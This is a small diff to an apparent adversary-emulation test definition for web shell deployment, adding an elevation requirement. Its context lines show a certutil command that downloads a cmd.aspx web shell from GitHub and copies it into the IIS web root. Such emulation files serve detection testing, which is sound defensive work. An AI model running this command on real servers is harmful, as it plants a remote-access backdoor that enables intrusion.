@@ -17,6 +17,7 @@ atomic_tests:
       default: C:\inetpub\wwwroot
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       certutil.exe -urlcache -split -f https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1100/shells/cmd.aspx
       xcopy cmd.aspx #{web_shell_path}
